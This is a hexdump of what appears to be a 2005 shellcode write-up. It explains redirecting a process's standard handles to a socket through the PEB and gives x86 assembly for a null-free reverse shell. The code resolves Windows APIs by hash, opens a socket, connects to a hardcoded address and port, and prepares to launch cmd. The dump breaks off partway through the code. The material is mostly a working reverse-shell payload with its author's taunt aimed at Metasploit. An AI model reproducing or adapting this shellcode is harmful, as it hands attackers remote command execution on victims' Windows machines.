00000000  57 65 20 75 73 65 20 74  68 65 20 50 45 42 20 66  |We use the PEB f|
00000010  6f 72 20 74 68 65 20 4f  75 74 70 75 74 2f 49 6e  |or the Output/In|
00000020  70 75 74 2f 45 72 72 6f  72 20 48 61 6e 64 6c 65  |put/Error Handle|
00000030  73 2e 0d 0a 0d 0a 74 79  70 65 64 65 66 20 73 74  |s.....typedef st|
00000040  72 75 63 74 20 50 45 42  0d 0a 42 4f 4f 4c 45 41  |ruct PEB..BOOLEA|
00000050  4e 20 49 6e 68 65 72 69  74 65 64 41 64 64 72 65  |N InheritedAddre|
00000060  73 73 53 70 61 63 65 20  3b 0d 0a 42 4f 4f 4c 45  |ssSpace ;..BOOLE|
00000070  41 4e 20 52 65 61 64 49  6d 61 67 65 46 69 6c 65  |AN ReadImageFile|
00000080  45 78 65 63 4f 70 74 69  6f 6e 73 20 3b 0d 0a 42  |ExecOptions ;..B|
00000090  4f 4f 4c 45 41 4e 20 42  65 69 6e 67 44 65 62 75  |OOLEAN BeingDebu|
000000a0  67 67 65 64 20 3b 0d 0a  42 4f 4f 4c 45 41 4e 20  |gged ;..BOOLEAN |
000000b0  53 70 61 72 65 20 3b 0d  0a 48 41 4e 44 4c 45 20  |Spare ;..HANDLE |
000000c0  4d 75 74 61 6e 74 20 3b  0d 0a 50 56 4f 49 44 20  |Mutant ;..PVOID |
000000d0  49 6d 61 67 65 42 61 73  65 41 64 64 72 65 73 73  |ImageBaseAddress|
000000e0  20 3b 0d 0a 50 50 45 42  20 4c 44 52 20 44 41 54  | ;..PPEB LDR DAT|
000000f0  41 20 4c 6f 61 64 65 72  44 61 74 61 20 3b 0d 0a  |A LoaderData ;..|
00000100  50 52 54 4c 20 55 53 45  52 20 50 52 4f 43 45 53  |PRTL USER PROCES|
00000110  53 20 50 41 52 41 4d 45  54 45 52 53 20 50 72 6f  |S PARAMETERS Pro|
00000120  63 65 73 73 50 61 72 61  6d 65 74 65 72 73 20 3b  |cessParameters ;|
00000130  0d 0a 2e 2e 2e 0d 0a 74  79 70 65 64 65 66 20 73  |.......typedef s|
00000140  74 72 75 63 74 20 52 54  4c 20 55 53 45 52 20 50  |truct RTL USER P|
00000150  52 4f 43 45 53 53 20 50  41 52 41 4d 45 54 45 52  |ROCESS PARAMETER|
00000160  53 0d 0a 55 4c 4f 4e 47  20 4d 61 78 69 6d 75 6d  |S..ULONG Maximum|
00000170  4c 65 6e 67 74 68 20 3b  0d 0a 55 4c 4f 4e 47 20  |Length ;..ULONG |
*
00000190  46 6c 61 67 73 20 3b 0d  0a 55 4c 4f 4e 47 20 44  |Flags ;..ULONG D|
000001a0  65 62 75 67 46 6c 61 67  73 20 3b 0d 0a 50 56 4f  |ebugFlags ;..PVO|
000001b0  49 44 20 43 6f 6e 73 6f  6c 65 48 61 6e 64 6c 65  |ID ConsoleHandle|
000001c0  20 3b 0d 0a 55 4c 4f 4e  47 20 43 6f 6e 73 6f 6c  | ;..ULONG Consol|
000001d0  65 46 6c 61 67 73 20 3b  0d 0a 48 41 4e 44 4c 45  |eFlags ;..HANDLE|
000001e0  20 53 74 64 49 6e 70 75  74 48 61 6e 64 6c 65 20  | StdInputHandle |
000001f0  3b 20 2b 31 38 68 0d 0a  48 41 4e 44 4c 45 20 53  |; +18h..HANDLE S|
00000200  74 64 4f 75 74 70 75 74  48 61 6e 64 6c 65 20 3b  |tdOutputHandle ;|
00000210  20 2b 31 43 68 0d 0a 48  41 4e 44 4c 45 20 53 74  | +1Ch..HANDLE St|
00000220  64 45 72 72 6f 72 48 61  6e 64 6c 65 20 3b 20 2b  |dErrorHandle ; +|
00000230  32 30 68 0d 0a 2e 2e 2e  0d 0a 0d 0a 53 6f 20 77  |20h.........So w|
00000240  69 74 68 20 74 68 65 20  6e 6f 6f 69 6c 20 74 72  |ith the nooil tr|
00000250  69 63 6b 73 20 77 65 20  68 61 76 65 20 6e 6f 77  |icks we have now|
00000260  20 3a 0d 0a 6d 6f 76 20  65 61 78 2c 64 77 6f 72  | :..mov eax,dwor|
00000270  64 20 70 74 72 20 66 73  20 3a 5b 31 38 68 5d 0d  |d ptr fs :[18h].|
00000280  0a 6d 6f 76 20 65 61 78  2c 64 77 6f 72 64 20 70  |.mov eax,dword p|
00000290  74 72 20 64 73 20 3a 5b  65 61 78 2b 33 30 68 5d  |tr ds :[eax+30h]|
000002a0  0d 0a 6d 6f 76 20 65 61  78 2c 64 77 6f 72 64 20  |..mov eax,dword |
000002b0  70 74 72 20 64 73 20 3a  5b 65 61 78 2b 31 30 68  |ptr ds :[eax+10h|
000002c0  5d 0d 0a 6d 6f 76 20 65  63 78 2c 20 68 43 6c 69  |]..mov ecx, hCli|
000002d0  65 6e 74 53 6f 63 6b 65  74 0d 0a 6d 6f 76 20 64  |entSocket..mov d|
000002e0  77 6f 72 64 20 70 74 72  20 64 73 20 3a 5b 65 61  |word ptr ds :[ea|
000002f0  78 2b 31 38 68 5d 2c 65  63 78 20 3b 20 53 65 74  |x+18h],ecx ; Set|
00000300  53 74 64 48 61 6e 64 6c  65 28 53 54 44 20 49 4e  |StdHandle(STD IN|
00000310  50 55 54 20 48 41 4e 44  4c 45 2c 68 43 6c 69 65  |PUT HANDLE,hClie|
00000320  6e 74 53 6f 63 6b 65 74  29 20 3b 0d 0a 6d 6f 76  |ntSocket) ;..mov|
00000330  20 64 77 6f 72 64 20 70  74 72 20 64 73 20 3a 5b  | dword ptr ds :[|
00000340  65 61 78 2b 31 43 68 5d  2c 65 63 78 20 3b 20 53  |eax+1Ch],ecx ; S|
00000350  65 74 53 74 64 48 61 6e  64 6c 65 28 53 54 44 20  |etStdHandle(STD |
00000360  4f 55 54 50 55 54 20 48  41 4e 44 4c 45 2c 68 43  |OUTPUT HANDLE,hC|
00000370  6c 69 65 6e 74 53 6f 63  6b 65 74 29 20 3b 0d 0a  |lientSocket) ;..|
00000380  6d 6f 76 20 64 77 6f 72  64 20 70 74 72 20 64 73  |mov dword ptr ds|
00000390  20 3a 5b 65 61 78 2b 32  30 68 5d 2c 65 63 78 20  | :[eax+20h],ecx |
000003a0  3b 20 53 65 74 53 74 64  48 61 6e 64 6c 65 28 53  |; SetStdHandle(S|
000003b0  54 44 20 45 52 52 4f 52  20 48 41 4e 44 4c 45 2c  |TD ERROR HANDLE,|
000003c0  68 43 6c 69 65 6e 74 53  6f 63 6b 65 74 29 20 3b  |hClientSocket) ;|
000003d0  0d 0a 0d 0a 32 34 39 20  62 79 74 65 73 20 52 65  |....249 bytes Re|
000003e0  76 65 72 73 65 20 47 65  6e 65 72 69 63 20 53 68  |verse Generic Sh|
000003f0  65 6c 6c 63 6f 64 65 20  77 69 74 68 6f 75 74 20  |ellcode without |
00000400  6c 6f 61 64 65 72 28 6e  6f 20 6e 75 6c 6c 20 62  |loader(no null b|
00000410  79 74 65 29 20 3a 0d 0a  0d 0a 63 6f 6d 6d 65 6e  |yte) :....commen|
00000420  74 20 2a 0d 0a 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |t *..-----------|
00000430  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000460  2d 2d 2d 2d 2d 2d 0d 0a  2d 2d 2d 2d 20 4e 65 77  |------..---- New|
00000470  20 67 65 6e 65 72 61 74  69 6f 6e 20 73 68 65 6c  | generation shel|
00000480  6c 63 6f 64 65 20 75 73  69 6e 67 20 6d 79 20 22  |lcode using my "|
00000490  6e 6f 6f 69 6c 20 74 72  69 63 6b 73 22 20 6d 65  |nooil tricks" me|
000004a0  74 68 6f 64 73 20 2d 2d  2d 0d 0a 2d 2d 2d 2d 20  |thods ---..---- |
000004b0  20 20 20 28 63 29 20 32  30 30 35 20 2d 20 4d 61  |   (c) 2005 - Ma|
000004c0  74 74 68 69 65 75 20 53  75 69 63 68 65 20 2f 20  |tthieu Suiche / |
000004d0  6d 73 75 69 63 68 65 40  67 6d 61 69 6c 2e 63 6f  |msuiche@gmail.co|
000004e0  6d 20 20 20 20 20 20 20  20 2d 2d 2d 0d 0a 32 34  |m        ---..24|
000004f0  39 20 62 79 74 65 73 20  52 65 76 65 72 73 65 20  |9 bytes Reverse |
00000500  47 65 6e 65 72 69 63 20  53 68 65 6c 6c 63 6f 64  |Generic Shellcod|
00000510  65 20 77 69 74 68 6f 75  74 20 6c 6f 61 64 65 72  |e without loader|
00000520  28 6e 6f 20 6e 75 6c 6c  20 62 79 74 65 29 0d 0a  |(no null byte)..|
00000530  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000570  2d 0d 0a 68 65 68 65 20  68 69 20 6d 65 74 61 73  |-..hehe hi metas|
00000580  70 6c 6f 69 74 27 73 20  67 75 79 73 20 3b 29 0d  |ploit's guys ;).|
00000590  0a 2a 0d 0a 2e 33 38 36  0d 0a 2e 6d 6f 64 65 6c  |.*...386...model|
000005a0  20 66 6c 61 74 2c 20 73  74 64 63 61 6c 6c 0d 0a  | flat, stdcall..|
000005b0  0d 0a 61 73 73 75 6d 65  20 66 73 3a 6e 6f 74 68  |..assume fs:noth|
000005c0  69 6e 67 0d 0a 0d 0a 4c  6f 61 64 4c 69 62 72 61  |ing....LoadLibra|
000005d0  72 79 41 20 20 20 20 65  71 75 20 30 44 36 43 33  |ryA    equ 0D6C3|
000005e0  44 38 39 38 68 0d 0a 57  53 41 53 74 61 72 74 75  |D898h..WSAStartu|
000005f0  70 41 20 20 20 20 20 65  71 75 20 30 43 37 42 33  |pA     equ 0C7B3|
00000600  42 34 43 42 68 0d 0a 57  53 41 53 6f 63 6b 65 74  |B4CBh..WSASocket|
00000610  41 20 20 20 20 20 20 65  71 75 20 30 42 38 41 43  |A      equ 0B8AC|
00000620  42 36 43 36 68 0d 0a 63  6f 6e 6e 65 63 74 20 20  |B6C6h..connect  |
00000630  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 65  |               e|
00000640  71 75 20 30 36 45 45 32  44 32 43 38 68 0d 0a 73  |qu 06EE2D2C8h..s|
00000650  79 73 74 65 6d 20 20 20  20 20 20 20 20 20 20 20  |ystem           |
00000660  20 20 20 20 20 20 20 65  71 75 20 30 45 38 37 33  |       equ 0E873|
00000670  45 36 44 38 68 0d 0a 45  78 69 74 50 72 6f 63 65  |E6D8h..ExitProce|
00000680  73 73 41 20 20 20 20 65  71 75 20 30 44 37 44 38  |ssA    equ 0D7D8|
00000690  45 41 39 35 68 0d 0a 3b  20 2d 2d 2d 2d 2d 2d 2d  |EA95h..; -------|
000006a0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
000006b0  2d 2d 2d 2d 2d 2d 2d 0d  0a 73 69 6e 5f 61 64 64  |-------..sin_add|
000006c0  72 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |r               |
000006d0  20 65 71 75 20 30 42 30  31 41 38 43 30 68 20 3b  | equ 0B01A8C0h ;|
000006e0  20 31 39 32 2e 31 36 38  2e 31 2e 31 31 0d 0a 73  | 192.168.1.11..s|
000006f0  69 6e 5f 70 6f 72 74 20  20 20 20 20 20 20 20 20  |in_port         |
00000700  20 20 20 20 20 20 20 65  71 75 20 33 37 31 33 68  |       equ 3713h|
00000710  20 20 20 20 20 20 20 3b  20 34 39 31 39 0d 0a 3b  |       ; 4919..;|
00000720  20 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  | ---------------|
00000730  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 0d  |---------------.|
00000740  0a 73 74 72 5f 63 6d 64  20 20 20 20 20 20 20 20  |.str_cmd        |
00000750  20 20 20 20 20 20 20 20  20 65 71 75 20 30 46 46  |         equ 0FF|
00000760  36 34 36 44 36 33 68 0d  0a 0d 0a 3b 20 2d 2d 2d  |646D63h....; ---|
00000770  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000007a0  2d 0d 0a 5f 6e 6f 6f 69  6c 5f 20 73 65 67 6d 65  |-.._nooil_ segme|
000007b0  6e 74 20 70 75 62 6c 69  63 20 3b 20 77 72 69 74  |nt public ; writ|
000007c0  61 62 6c 65 20 73 65 63  74 69 6f 6e 0d 0a 3b 2e  |able section..;.|
000007d0  0d 0a 3b 20 2d 2d 2d 2d  2d 20 43 4f 44 45 20 2d  |..; ----- CODE -|
000007e0  2d 2d 2d 2d 0d 0a 73 63  6f 64 65 3a 0d 0a 20 20  |----..scode:..  |
000007f0  20 20 20 20 20 6a 6d 70  20 73 68 6f 72 74 20 5f  |     jmp short _|
00000800  65 69 70 0d 0a 20 20 20  20 20 20 20 47 65 74 45  |eip..       GetE|
00000810  69 70 3a 0d 0a 20 20 20  20 20 20 20 70 6f 70 20  |ip:..       pop |
00000820  20 20 20 20 20 20 20 20  20 20 20 20 65 64 69 0d  |            edi.|
00000830  0a 20 20 20 20 20 20 20  6a 6d 70 20 73 68 6f 72  |.       jmp shor|
00000840  74 20 45 6e 74 72 79 50  6f 69 6e 74 0d 0a 5f 65  |t EntryPoint.._e|
00000850  69 70 3a 0d 0a 20 20 20  20 20 20 20 63 61 6c 6c  |ip:..       call|
00000860  20 20 20 20 47 65 74 45  69 70 0d 0a 4b 65 72 6e  |    GetEip..Kern|
00000870  65 6c 33 32 42 61 73 65  41 64 64 72 3a 0d 0a 20  |el32BaseAddr:.. |
00000880  20 20 20 20 20 20 70 75  73 68 61 64 0d 0a 20 20  |      pushad..  |
00000890  20 20 20 20 20 74 65 73  74 20 20 20 20 65 61 78  |     test    eax|
000008a0  2c 20 65 61 78 0d 0a 20  20 20 20 20 20 20 6a 6e  |, eax..       jn|
000008b0  7a 20 20 20 20 20 20 20  20 20 20 20 20 20 4d 79  |z             My|
000008c0  47 65 74 50 72 6f 63 41  64 64 72 0d 0a 20 20 20  |GetProcAddr..   |
000008d0  20 20 20 20 3b 20 65 61  78 20 3d 20 30 0d 0a 20  |    ; eax = 0.. |
000008e0  20 20 20 20 20 20 6d 6f  76 20 20 20 20 20 65 61  |      mov     ea|
000008f0  78 2c 20 64 77 6f 72 64  20 70 74 72 20 66 73 3a  |x, dword ptr fs:|
00000900  5b 65 61 78 2b 33 30 68  5d 0d 0a 20 20 20 20 20  |[eax+30h]..     |
00000910  20 20 6d 6f 76 20 20 20  20 20 65 61 78 2c 20 64  |  mov     eax, d|
00000920  77 6f 72 64 20 70 74 72  20 64 73 3a 5b 65 61 78  |word ptr ds:[eax|
00000930  2b 30 63 68 5d 0d 0a 20  20 20 20 20 20 20 6d 6f  |+0ch]..       mo|
00000940  76 20 20 20 20 20 65 73  69 2c 20 64 77 6f 72 64  |v     esi, dword|
00000950  20 70 74 72 20 64 73 3a  5b 65 61 78 2b 31 63 68  | ptr ds:[eax+1ch|
00000960  5d 0d 0a 20 20 20 20 20  20 20 6c 6f 64 73 64 0d  |]..       lodsd.|
00000970  0a 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 20  |.       mov     |
00000980  65 61 78 2c 20 64 77 6f  72 64 20 70 74 72 20 64  |eax, dword ptr d|
00000990  73 3a 5b 65 61 78 2b 30  38 68 5d 0d 0a 4d 79 47  |s:[eax+08h]..MyG|
000009a0  65 74 50 72 6f 63 41 64  64 72 3a 0d 0a 20 20 20  |etProcAddr:..   |
000009b0  20 20 20 20 6d 6f 76 20  20 20 20 20 20 20 20 20  |    mov         |
000009c0  20 20 20 20 65 64 78 2c  20 65 61 78 0d 0a 0d 0a  |    edx, eax....|
000009d0  3b 20 2d 20 50 45 0d 0a  20 20 20 20 20 20 20 61  |; - PE..       a|
000009e0  64 64 20 20 20 20 20 20  20 20 20 20 20 20 20 65  |dd             e|
000009f0  64 78 2c 20 64 77 6f 72  64 20 70 74 72 20 64 73  |dx, dword ptr ds|
00000a00  3a 5b 65 64 78 2b 33 63  68 5d 0d 0a 0d 0a 3b 20  |:[edx+3ch]....; |
00000a10  2d 20 45 78 70 6f 72 74  20 54 61 62 6c 65 0d 0a  |- Export Table..|
00000a20  20 20 20 20 20 20 20 6d  6f 76 20 20 20 20 20 20  |       mov      |
00000a30  20 20 20 20 20 20 20 65  64 78 2c 20 64 77 6f 72  |       edx, dwor|
00000a40  64 20 70 74 72 20 64 73  3a 5b 65 64 78 2b 37 38  |d ptr ds:[edx+78|
00000a50  68 5d 0d 0a 20 20 20 20  20 20 20 61 64 64 20 20  |h]..       add  |
00000a60  20 20 20 20 20 20 20 20  20 20 20 65 64 78 2c 20  |           edx, |
00000a70  65 61 78 0d 0a 0d 0a 20  20 20 20 20 20 20 6d 6f  |eax....       mo|
00000a80  76 20 20 20 20 20 65 62  78 2c 20 64 77 6f 72 64  |v     ebx, dword|
00000a90  20 70 74 72 20 64 73 3a  5b 65 64 78 2b 32 30 68  | ptr ds:[edx+20h|
00000aa0  5d 0d 0a 20 20 20 20 20  20 20 61 64 64 20 20 20  |]..       add   |
00000ab0  20 20 20 20 20 20 20 20  20 20 65 62 78 2c 20 65  |          ebx, e|
00000ac0  61 78 0d 0a 0d 0a 20 20  20 20 20 20 20 78 6f 72  |ax....       xor|
00000ad0  20 20 20 20 20 20 20 20  20 20 20 20 20 65 63 78  |             ecx|
00000ae0  2c 20 65 63 78 0d 0a 20  20 20 20 20 20 20 6d 6f  |, ecx..       mo|
00000af0  76 20 20 20 20 20 20 20  20 20 20 20 20 20 65 62  |v             eb|
00000b00  70 2c 20 65 61 78 0d 0a  0d 0a 46 69 6e 64 41 64  |p, eax....FindAd|
00000b10  64 72 3a 0d 0a 20 20 20  20 20 20 20 69 6e 63 20  |dr:..       inc |
00000b20  20 20 20 20 20 20 20 20  20 20 20 20 65 63 78 0d  |            ecx.|
00000b30  0a 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 20  |.       mov     |
00000b40  65 64 69 2c 20 64 77 6f  72 64 20 70 74 72 20 64  |edi, dword ptr d|
00000b50  73 3a 5b 65 62 78 2b 65  63 78 2a 34 5d 0d 0a 20  |s:[ebx+ecx*4].. |
00000b60  20 20 20 20 20 20 61 64  64 20 20 20 20 20 20 20  |      add       |
00000b70  20 20 20 20 20 20 65 64  69 2c 20 65 61 78 0d 0a  |      edi, eax..|
00000b80  0d 0a 20 20 20 20 20 20  20 6d 6f 76 20 20 20 20  |..       mov    |
00000b90  20 20 20 20 20 20 20 20  20 65 73 69 2c 20 64 77  |         esi, dw|
00000ba0  6f 72 64 20 70 74 72 20  5b 65 64 69 5d 0d 0a 20  |ord ptr [edi].. |
00000bb0  20 20 20 20 20 20 61 64  64 20 20 20 20 20 20 20  |      add       |
00000bc0  20 20 20 20 20 20 65 73  69 2c 20 64 77 6f 72 64  |      esi, dword|
00000bd0  20 70 74 72 20 5b 65 64  69 2b 34 5d 0d 0a 20 20  | ptr [edi+4]..  |
00000be0  20 20 20 20 20 63 6d 70  20 20 20 20 20 20 20 20  |     cmp        |
00000bf0  20 20 20 20 20 65 73 69  2c 20 5b 65 73 70 2b 33  |     esi, [esp+3|
00000c00  36 5d 0d 0a 20 20 20 20  20 20 20 6a 7a 20 20 20  |6]..       jz   |
00000c10  20 20 20 20 20 20 20 20  20 20 20 41 64 64 72 46  |           AddrF|
00000c20  6f 75 6e 64 0d 0a 20 20  20 20 20 20 20 6a 6d 70  |ound..       jmp|
00000c30  20 20 20 20 20 20 20 20  20 20 20 20 20 73 68 6f  |             sho|
00000c40  72 74 20 46 69 6e 64 41  64 64 72 0d 0a 0d 0a 41  |rt FindAddr....A|
00000c50  64 64 72 46 6f 75 6e 64  3a 0d 0a 0d 0a 20 20 20  |ddrFound:....   |
00000c60  20 20 20 20 6d 6f 76 20  20 20 20 20 65 62 78 2c  |    mov     ebx,|
00000c70  20 64 77 6f 72 64 20 70  74 72 20 64 73 3a 5b 65  | dword ptr ds:[e|
00000c80  64 78 2b 32 34 68 5d 0d  0a 20 20 20 20 20 20 20  |dx+24h]..       |
00000c90  61 64 64 20 20 20 20 20  65 62 78 2c 20 65 62 70  |add     ebx, ebp|
00000ca0  0d 0a 20 20 20 20 20 20  20 6d 6f 76 20 20 20 20  |..       mov    |
00000cb0  20 63 78 2c 77 6f 72 64  20 70 74 72 20 64 73 3a  | cx,word ptr ds:|
00000cc0  5b 65 62 78 2b 65 63 78  2a 32 5d 0d 0a 0d 0a 20  |[ebx+ecx*2].... |
00000cd0  20 20 20 20 20 20 6d 6f  76 20 20 20 20 20 65 62  |      mov     eb|
00000ce0  78 2c 20 64 77 6f 72 64  20 70 74 72 20 64 73 3a  |x, dword ptr ds:|
00000cf0  5b 65 64 78 2b 31 43 68  5d 0d 0a 20 20 20 20 20  |[edx+1Ch]..     |
00000d00  20 20 61 64 64 20 20 20  20 20 65 62 78 2c 20 65  |  add     ebx, e|
00000d10  62 70 0d 0a 20 20 20 20  20 20 20 61 64 64 20 20  |bp..       add  |
00000d20  20 20 20 65 62 70 2c 20  64 77 6f 72 64 20 70 74  |   ebp, dword pt|
00000d30  72 20 64 73 3a 5b 65 62  78 2b 65 63 78 2a 34 5d  |r ds:[ebx+ecx*4]|
00000d40  0d 0a 0d 0a 20 20 20 20  20 20 20 6d 6f 76 20 20  |....       mov  |
00000d50  20 20 20 20 20 20 20 20  20 20 20 64 77 6f 72 64  |           dword|
00000d60  20 70 74 72 20 5b 65 73  70 2b 32 38 5d 2c 20 65  | ptr [esp+28], e|
00000d70  62 70 0d 0a 20 20 20 20  20 20 20 70 6f 70 61 64  |bp..       popad|
00000d80  0d 0a 20 20 20 20 20 20  20 72 65 74 6e 0d 0a 0d  |..       retn...|
00000d90  0a 45 6e 74 72 79 50 6f  69 6e 74 3a 0d 0a 20 20  |.EntryPoint:..  |
00000da0  20 20 20 20 20 78 6f 72  20 20 20 20 20 20 20 20  |     xor        |
00000db0  20 20 20 20 20 65 61 78  2c 20 65 61 78 0d 0a 20  |     eax, eax.. |
00000dc0  20 20 20 20 20 20 78 6f  72 20 20 20 20 20 20 20  |      xor       |
00000dd0  20 20 20 20 20 20 65 63  78 2c 20 65 63 78 0d 0a  |      ecx, ecx..|
00000de0  20 20 20 20 20 20 20 70  75 73 68 20 20 20 20 4c  |       push    L|
00000df0  6f 61 64 4c 69 62 72 61  72 79 41 0d 0a 20 20 20  |oadLibraryA..   |
00000e00  20 20 20 20 63 61 6c 6c  20 20 20 20 65 64 69 20  |    call    edi |
00000e10  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000e40  20 20 20 20 3b 20 4d 79  47 65 74 50 72 6f 63 41  |    ; MyGetProcA|
00000e50  64 64 72 28 4c 6f 61 64  4c 69 62 72 61 72 79 41  |ddr(LoadLibraryA|
00000e60  29 3b 0d 0a 20 20 20 20  20 20 20 6d 6f 76 20 20  |);..       mov  |
00000e70  20 20 20 20 20 20 20 20  20 20 20 65 62 70 2c 20  |           ebp, |
00000e80  65 61 78 0d 0a 0d 0a 20  20 20 20 20 20 20 70 75  |eax....       pu|
00000e90  73 68 20 20 20 20 63 78  0d 0a 20 20 20 20 20 20  |sh    cx..      |
00000ea0  20 70 75 73 68 20 20 20  20 77 6f 72 64 20 70 74  | push    word pt|
00000eb0  72 20 27 32 33 27 0d 0a  20 20 20 20 20 20 20 70  |r '23'..       p|
00000ec0  75 73 68 20 20 20 20 27  5f 32 73 77 27 0d 0a 20  |ush    '_2sw'.. |
00000ed0  20 20 20 20 20 20 70 75  73 68 20 20 20 20 65 73  |      push    es|
00000ee0  70 0d 0a 20 20 20 20 20  20 20 63 61 6c 6c 20 20  |p..       call  |
00000ef0  20 20 65 61 78 20 20 20  20 20 20 20 20 20 20 20  |  eax           |
00000f00  20 20 3b 20 4c 6f 61 64  4c 69 62 72 61 72 79 41  |  ; LoadLibraryA|
00000f10  28 22 77 73 32 5f 33 32  22 29 3b 0d 0a 0d 0a 20  |("ws2_32");.... |
00000f20  20 20 20 20 20 20 6d 6f  76 20 20 20 20 20 20 20  |      mov       |
00000f30  20 20 20 20 20 20 65 62  78 2c 20 65 61 78 0d 0a  |      ebx, eax..|
00000f40  0d 0a 20 20 20 20 20 20  20 70 75 73 68 20 20 20  |..       push   |
00000f50  20 57 53 41 53 74 61 72  74 75 70 41 0d 0a 20 20  | WSAStartupA..  |
00000f60  20 20 20 20 20 63 61 6c  6c 20 20 20 20 65 64 69  |     call    edi|
00000f70  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 4d  |             ; M|
00000f80  79 47 65 74 50 72 6f 63  41 64 64 72 28 57 53 41  |yGetProcAddr(WSA|
00000f90  53 74 61 72 74 75 70 41  29 0d 0a 0d 0a 0d 0a 20  |StartupA)...... |
00000fa0  20 20 20 20 20 20 6d 6f  76 20 20 20 20 20 20 20  |      mov       |
00000fb0  20 20 20 20 20 20 65 73  69 2c 20 65 73 70 0d 0a  |      esi, esp..|
00000fc0  20 20 20 20 20 20 20 61  64 64 20 20 20 20 20 20  |       add      |
00000fd0  20 20 20 20 20 20 20 73  69 2c 20 2d 33 30 31 68  |       si, -301h|
00000fe0  0d 0a 20 20 20 20 20 20  20 70 75 73 68 20 20 20  |..       push   |
00000ff0  20 65 73 69 0d 0a 20 20  20 20 20 20 20 70 75 73  | esi..       pus|
00001000  68 20 20 20 20 32 0d 0a  20 20 20 20 20 20 20 63  |h    2..       c|
00001010  61 6c 6c 20 20 20 20 65  61 78 20 20 20 20 20 20  |all    eax      |
00001020  20 20 20 20 20 20 20 3b  20 57 53 41 53 74 61 72  |       ; WSAStar|
00001030  74 75 70 28 32 2c 26 57  53 41 73 74 72 75 63 74  |tup(2,&WSAstruct|
00001040  29 3b 0d 0a 0d 0a 20 20  20 20 20 20 20 6d 6f 76  |);....       mov|
00001050  20 20 20 20 20 20 20 20  20 20 20 20 20 65 61 78  |             eax|
00001060  2c 20 65 62 78 0d 0a 0d  0a 20 20 20 20 20 20 20  |, ebx....       |
00001070  70 75 73 68 20 20 20 20  57 53 41 53 6f 63 6b 65  |push    WSASocke|
00001080  74 41 0d 0a 20 20 20 20  20 20 20 63 61 6c 6c 20  |tA..       call |
00001090  20 20 20 65 64 69 20 20  20 20 20 20 20 20 20 20  |   edi          |
000010a0  20 20 20 3b 20 4d 79 47  65 74 50 72 6f 63 41 64  |   ; MyGetProcAd|
000010b0  64 72 28 57 53 41 53 6f  63 6b 65 74 41 29 3b 0d  |dr(WSASocketA);.|
000010c0  0a 0d 0a 20 20 20 20 20  20 20 78 6f 72 20 20 20  |...       xor   |
000010d0  20 20 20 20 20 20 20 20  20 20 65 73 69 2c 20 65  |          esi, e|
000010e0  73 69 0d 0a 20 20 20 20  20 20 20 70 75 73 68 20  |si..       push |
000010f0  20 20 20 65 73 69 0d 0a  20 20 20 20 20 20 20 70  |   esi..       p|
00001100  75 73 68 20 20 20 20 65  73 69 0d 0a 20 20 20 20  |ush    esi..    |
00001110  20 20 20 70 75 73 68 20  20 20 20 65 73 69 0d 0a  |   push    esi..|
00001120  20 20 20 20 20 20 20 70  75 73 68 20 20 20 20 65  |       push    e|
00001130  73 69 0d 0a 20 20 20 20  20 20 20 69 6e 63 20 20  |si..       inc  |
00001140  20 20 20 20 20 20 20 20  20 20 20 65 73 69 0d 0a  |           esi..|
00001150  20 20 20 20 20 20 20 70  75 73 68 20 20 20 20 65  |       push    e|
00001160  73 69 0d 0a 20 20 20 20  20 20 20 69 6e 63 20 20  |si..       inc  |
00001170  20 20 20 20 20 20 20 20  20 20 20 65 73 69 0d 0a  |           esi..|
00001180  20 20 20 20 20 20 20 70  75 73 68 20 20 20 20 65  |       push    e|
00001190  73 69 0d 0a 20 20 20 20  20 20 20 63 61 6c 6c 20  |si..       call |
000011a0  20 20 20 65 61 78 20 20  20 20 20 20 20 20 20 20  |   eax          |
000011b0  20 20 20 3b 20 57 53 41  53 6f 63 6b 65 74 28 32  |   ; WSASocket(2|
000011c0  2c 31 2c 30 2c 30 2c 30  2c 30 29 3b 0d 0a 0d 0a  |,1,0,0,0,0);....|
000011d0  20 20 20 20 20 20 20 78  63 68 67 20 20 20 20 65  |       xchg    e|
000011e0  62 78 2c 20 65 61 78 20  3b 20 65 62 78 20 3d 20  |bx, eax ; ebx = |
000011f0  73 6f 63 6b 66 64 20 2c  20 65 61 78 20 3d 20 77  |sockfd , eax = w|
00001200  73 32 5f 33 32 0d 0a 0d  0a 20 20 20 20 20 20 20  |s2_32....       |
00001210  70 75 73 68 20 20 20 20  73 69 6e 5f 61 64 64 72  |push    sin_addr|
00001220  0d 0a 20 20 20 20 20 20  20 70 75 73 68 20 20 20  |..       push   |
00001230  20 77 6f 72 64 20 70 74  72 20 73 69 6e 5f 70 6f  | word ptr sin_po|
00001240  72 74 0d 0a 20 20 20 20  20 20 20 70 75 73 68 20  |rt..       push |
00001250  20 20 20 73 69 0d 0a 20  20 20 20 20 20 20 6d 6f  |   si..       mo|
00001260  76 20 20 20 20 20 20 20  20 20 20 20 20 20 65 73  |v             es|
00001270  69 2c 20 65 73 70 0d 0a  0d 0a 20 20 20 20 20 20  |i, esp....      |
00001280  20 70 75 73 68 20 20 20  20 63 6f 6e 6e 65 63 74  | push    connect|
00001290  0d 0a 20 20 20 20 20 20  20 63 61 6c 6c 20 20 20  |..       call   |
000012a0  20 65 64 69 20 20 20 20  20 20 20 20 20 20 20 20  | edi            |
000012b0  20 3b 20 4d 79 47 65 74  50 72 6f 63 41 64 64 72  | ; MyGetProcAddr|
000012c0  28 63 6f 6e 6e 65 63 74  29 0d 0a 0d 0a 20 20 20  |(connect)....   |
000012d0  20 20 20 20 70 75 73 68  20 20 20 20 31 30 68 0d  |    push    10h.|
000012e0  0a 20 20 20 20 20 20 20  70 75 73 68 20 20 20 20  |.       push    |
